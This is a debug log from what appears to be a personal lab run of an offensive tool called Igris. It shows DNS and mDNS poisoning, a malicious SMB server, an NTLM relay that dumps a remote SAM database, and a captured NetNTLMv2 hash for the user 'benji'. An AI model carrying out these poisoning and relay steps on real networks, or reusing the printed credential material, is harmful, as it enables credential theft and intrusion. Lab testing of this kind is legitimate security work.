2021-11-14 17:57:25.967 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
2021-11-15 09:54:17.727 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:17.728 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:17.729 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:17.729 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:18.375 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Retrieving class info for JD
2021-11-15 09:54:18.412 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Retrieving class info for Skew1
2021-11-15 09:54:18.446 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Retrieving class info for GBG
2021-11-15 09:54:18.470 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Retrieving class info for Data
2021-11-15 09:54:18.495 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-11-15 09:54:18.495 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:109 - Saving remote SAM database
2021-11-15 09:54:18.592 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-11-15 09:54:18.601 | DEBUG    | impacket.examples.secretsdump:dump:1217 - Calculating HashedBootKey from SAM
2021-11-15 09:54:18.822 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
2021-11-15 09:54:18.914 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
2021-11-15 09:54:19.008 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
2021-11-15 09:54:19.108 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
2021-11-15 09:54:19.208 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
2021-11-15 09:54:19.218 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
2021-11-15 09:54:19.219 | DEBUG    | project.ManInTheMiddle.maninthemiddle:__display_sam_alert:278 - The SAM of 192.168.253.129 has been dumped
2021-11-15 09:54:19.225 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
2021-11-15 09:54:23.972 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:23.973 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:23.973 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-15 09:54:24.003 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:24.003 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:24.003 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-15 09:54:24.035 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:24.035 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:24.036 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:24.036 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:24.978 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:24.978 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:24.979 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:24.979 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:25.013 | DEBUG    | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:381 - No more targets for user RSGBENGICORP/BENJI
2021-11-15 09:54:25.014 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-10: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-15 09:54:25.022 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:25.023 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:25.024 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:25.024 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:25.025 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:25.025 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:25.026 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:25.026 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:26.492 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:26.492 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:26.493 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:26.494 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:26.500 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:26.502 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:26.517 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:26.522 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:27.292 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:27.293 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:27.294 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:27.294 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:27.308 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:27.308 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:27.309 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:27.309 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:27.494 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:27.494 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:27.495 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:27.495 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:27.496 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:27.496 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:27.497 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:27.497 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:28.306 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:28.306 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:28.307 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:28.307 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:28.308 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:28.308 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:28.309 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 09:54:28.309 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 09:54:45.777 | DEBUG    | project.ManInTheMiddle.maninthemiddle:ntlm_relay_postloop:543 - Finishing ntlm_relay process ...
2021-11-15 09:54:45.806 | DEBUG    | project.ManInTheMiddle.maninthemiddle:ntlm_relay_postloop:548 - Finishing alerts thread ...
2021-11-16 16:05:02.855 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:185 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-16 16:05:02.856 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-16 16:05:02.863 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:205 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-16 16:05:02.870 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-16 16:05:02.871 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
2021-11-16 16:05:02.880 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-16 16:05:02.885 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-16 16:05:02.887 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-16 16:05:09.710 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:60 - Finishing mss attack in the background ...
2021-11-16 16:21:18.337 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:185 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-16 16:21:18.338 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-16 16:21:18.343 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:205 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-16 16:21:18.352 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-16 16:21:18.353 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
2021-11-16 16:21:18.361 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-16 16:21:18.370 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-16 16:21:18.379 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-16 16:21:19.024 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:19.024 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:19.025 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-16 16:21:19.073 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:19.074 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:19.074 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-16 16:21:20.641 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:20.642 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:20.649 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:20.650 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:20.661 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:20.661 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:20.665 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:20.665 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:20.682 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:20.683 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:20.684 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:20.684 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:21.019 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:21.020 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:21.021 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:21.021 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:21.629 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:21.629 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:21.630 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:21.631 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:21.661 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:21.661 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:21.662 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:21.663 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:21.678 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:21.678 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:21.679 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:21.680 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:24.366 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:24.367 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:24.371 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:24.372 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:24.376 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:24.377 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:24.380 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:24.381 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:25.353 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:25.354 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:25.357 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:25.358 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:25.368 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:25.369 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:25.374 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:25.375 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:26.631 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:26.631 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:26.636 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:26.636 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:26.641 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:26.641 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:26.645 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:26.646 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:27.618 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:27.618 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:27.619 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:27.619 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:34.689 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:34.690 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:34.690 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-16 16:21:34.737 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:34.738 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:34.739 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-16 16:21:34.791 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:34.792 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:34.797 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-16 16:21:34.797 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-16 16:21:35.688 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.130,49783)
2021-11-16 16:21:35.869 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-16 16:21:35.872 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BENJI\benji authenticated successfully
2021-11-16 16:21:35.882 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:fe515a45cda9da20fdc3e55947bbdefc:01010000000000008091230606dbd70172ea416e2277a11c0000000001001000750056004100550062006d0049006b0003001000750056004100550062006d0049006b00020010004b006900610062005a00680044006200040010004b006900610062005a00680044006200070008008091230606dbd70106000400020000000800300030000000000000000000000000200000f0a6f9cdc2583c0a85f6fe23428e9f3fc2bbfcdc2a6dfbdd04811907533c08650a001000000000000000000000000000000000000900340063006900660073002f006a006b006c006100730064006a00660066006a006b006c00640066006a002e006c006f00630061006c000000000000000000
2021-11-16 16:21:35.912 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
2021-11-16 16:21:35.930 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
2021-11-16 16:21:36.209 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
2021-11-16 16:21:37.946 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:111 - Exiting smb relay attack ...
2021-11-16 16:41:27.420 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:185 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-16 16:41:27.421 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-16 16:41:27.425 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:205 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-16 16:41:27.432 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-16 16:41:27.432 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
2021-11-16 16:41:27.437 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-16 16:41:27.438 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-16 16:41:27.438 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-16 16:41:30.226 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:111 - Exiting smb relay attack ...
2021-11-16 16:44:00.325 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:185 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-16 16:44:00.326 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-16 16:44:00.331 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:205 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-16 16:44:00.340 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-16 16:44:00.341 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
